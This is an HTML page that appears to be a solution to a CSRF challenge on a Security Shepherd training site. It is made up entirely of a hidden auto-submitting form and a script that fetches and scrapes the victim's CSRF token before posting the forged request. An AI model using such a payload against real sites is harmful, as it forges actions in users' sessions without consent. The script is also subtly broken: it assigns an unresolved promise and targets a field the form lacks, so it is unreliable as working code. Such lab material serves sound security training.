<html>
    <body>

        <form name="ff" action="https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/plusplus" method="POST">
            <input type="hidden" name="userId" value="d35874530d87a07ad3cd5864affdf5736743f5ad" />
            <input type="hidden" name="csrfToken" value="-88605069916570598180212829361425611559" />
            <input type="submit"/>
        </form>

        <script>
            var userId = $(contentDiv).children('ul')[0].children[0].children[0].text;
            const regex = /Your csrf Token for this Challenge is: (.+) <br\/>/;
            const csrf=fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/getToken?userId='+ userId)
                .then(resp=>resp.text())
                .then(body=>{
                                let match = body.match(regex);
                                return match[1];
                            })

            document.ff.csrfForm.value = csrf;
            document.ff.submit();

        </script>
    </body>
</html>
